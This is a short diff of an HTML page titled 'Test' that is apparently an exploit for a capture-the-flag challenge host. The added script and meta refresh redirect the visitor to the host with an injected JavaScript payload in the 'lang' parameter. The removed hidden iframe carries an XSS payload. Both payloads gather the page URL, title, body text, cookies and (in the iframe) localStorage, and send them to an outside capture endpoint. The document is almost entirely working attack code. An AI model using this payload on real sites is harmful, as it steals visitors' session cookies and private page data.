@@ -2,8 +2,19 @@
 <html>
 <head>
     <title>Test</title>
+    <script>
+        // Use meta refresh as backup
+        setTimeout(function() {
+            // Obfuscated payload to extract page info
+            const payload = '"; var info = {url: location.href, title: document.title, body: document.body.innerHTML.substring(0,500), cookies: document.cookie}; var img = new Image(); img.src = "https://ssrf-eta.vercel.app/api/capture?data=" + encodeURIComponent(JSON.stringify(info)); //';
+            
+            const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(payload);
+            window.location.href = targetUrl;
+        }, 1000);
+    </script>
+    <meta http-equiv="refresh" content="2; url=http://chal1.lagncra.sh:8426/?lang=%22%3B%20var%20info%20%3D%20%7Burl%3A%20location.href%2C%20title%3A%20document.title%2C%20body%3A%20document.body.innerHTML.substring(0%2C500)%2C%20cookies%3A%20document.cookie%7D%3B%20var%20img%20%3D%20new%20Image()%3B%20img.src%20%3D%20%22https%3A//ssrf-eta.vercel.app/api/capture%3Fdata%3D%22%20%2B%20encodeURIComponent(JSON.stringify(info))%3B%20//">
 </head>
 <body>
-    <iframe src="http://chal1.lagncra.sh:8426/?lang=%22%3E%3Cimg%20src%3D%22x%22%20onerror%3D%22var%20info%3D%7Burl%3Alocation.href%2Ctitle%3Adocument.title%2Cbody%3Adocument.body.innerHTML.substring(0%2C500)%2Ccookies%3Adocument.cookie%2Cstorage%3AtryGetStorage()%7D%3Bfunction%20tryGetStorage()%7Btry%7Breturn%20JSON.stringify(localStorage)%7Dcatch(e)%7Breturn%20e.message%7D%7Dthis.src%3D%27https%3A//ssrf-eta.vercel.app/api/capture%3Fdata%3D%27%2BencodeURIComponent(JSON.stringify(info))%22%3E" width="1" height="1" style="display:none;"></iframe>
+    <p>Redirecting...</p>
 </body>
 </html>
